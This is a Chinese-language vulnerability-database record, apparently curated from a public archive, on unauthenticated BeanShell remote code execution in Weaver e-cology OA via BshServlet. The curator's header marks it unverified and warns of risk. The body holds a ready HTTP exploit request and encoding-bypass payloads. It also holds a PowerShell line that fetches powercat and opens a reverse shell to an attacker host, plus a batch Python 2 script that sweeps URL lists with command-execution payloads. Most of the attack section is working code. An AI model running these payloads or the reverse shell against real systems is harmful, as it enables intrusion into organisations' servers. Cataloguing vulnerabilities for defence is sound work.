---
source: "hatch 补库批 20260928"
title: "泛微e-cology BshServlet未授权BeanShell 远程代码执行"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "<=9.0声称；2019-09-17补丁，平台/路径变体"
prerequisites: "声称未认证"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20E-cology%20%3C%3D9.0%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
id: "vw-cacdee1b833cf6bc5d8a6b74"
entity_id: "ve-cacdee1b833cf6bc5d8a6b74"
schema_version: "1"
---

# 泛微e-cology BshServlet未授权BeanShell 远程代码执行

## 条目说明

- 对象与具体问题：泛微e-cology；BshServlet未授权BeanShell RCE
- 版本、配置及部署条件：<=9.0声称；2019-09-17补丁，平台/路径变体
- 认证与权限前提：声称未认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与Bsh短篇同请求，新增路径变体和Python2批量脚本，可做附录而非另建漏洞
- 脚本以200且无三种字符串判成功，可能误报；print/except为Python2，启动说明未标版本且缺sys.argv参数
- 代码重复Content-Type键和固定Content-Length；转码{=html}块噪声
- 文中多数Windows/利用工具提及不构成产品版本证明

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

一、漏洞简介
------------

2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology
OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口,
可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行,
漏洞等级严重.

二、漏洞影响
------------

e-cology \<=9.0

三、复现过程
------------

#### 漏洞指纹

    Set-Cookie: ecology_JSessionId=

ecology

    /weaver/bsh.servlet.BshServlet

#### 漏洞复现

```http
    POST /weaver/bsh.servlet.BshServlet HTTP/1.1
    Host: www.0-sec.org:8088
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Length: 98
    Content-Type: application/x-www-form-urlencoded

    bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
```

***利用技巧***

-   1.其他形式绕过

```{=html}
<!-- -->
```
    eval%00("ex"%2b"ec(\"whoami\")"); 也可以换成 ex\u0065c("cmd /c dir");

-   2.泛微多数都是windows环境, 反弹shell可以使用pcat

```{=html}
<!-- -->
```
    powershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd

#### poc

useage

    #1.install python Dependencies Library 
    pip install requests

    #2.批量脚本 执行 
    python Weaver-Ecology-OA_RCE-exp.py 


    url.txt文件中 是url地址 需要带http协议
    #/usr/bin/python
    #coding:utf-8
    #Author:Ja0k
    #For Weaver-Ecology-OA_RCE

    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    import requests,sys

    headers = {
        'Content-Type': 'text/xml; charset=utf-8',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Cache-Control': 'max-age=0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1',
        'Content-Length': '578'
    }

    proxies= {'http':'http://127.0.0.1:8080'}
                
    def Poc_check(target):

        Url_Payload1="/bsh.servlet.BshServlet"
        Url_Payload2="/weaver/bsh.servlet.BshServlet"
        Url_Payload3="/weaveroa/bsh.servlet.BshServlet"
        Url_Payload4="/oa/bsh.servlet.BshServlet"
        
        Data_Payload1="""bsh.script=exec("whoami");&bsh.servlet.output=raw"""
        Data_Payload2= """bsh.script=\u0065\u0078\u0065\u0063("whoami");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw"""
        Data_Payload3= """bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami"""
        for Url_Payload in (Url_Payload1,Url_Payload2,Url_Payload3,Url_Payload4):
            url= target + Url_Payload
            for Data_payload in (Data_Payload1,Data_Payload2,Data_Payload3): 
                try:
                    http_response = requests.post(url,data=Data_payload,headers=headers,verify=False)
                    #print http_response.status_code
                    if http_response.status_code == 200:
                        if ";</script>" not in (http_response.content):
                            if "Login.jsp" not in (http_response.content):
                                if "Error" not in (http_response.content):
                                    print "{0} is a E-cologyOA_RCE Vulnerability".format(url)
                                    print "Server Current Username：{0}".format(http_response.content)
                    elif http_response.status_code == 500:
                        print "{0}500 maybe is Weaver-EcologyOA，Please confirm by yourself ".format(url)
                    else:
                        pass              
                except Exception,Error:
                    pass    
        
    if __name__ == '__main__':
        for line in open(sys.argv[1]).readlines():
            target=line.strip()
            Poc_check(target)
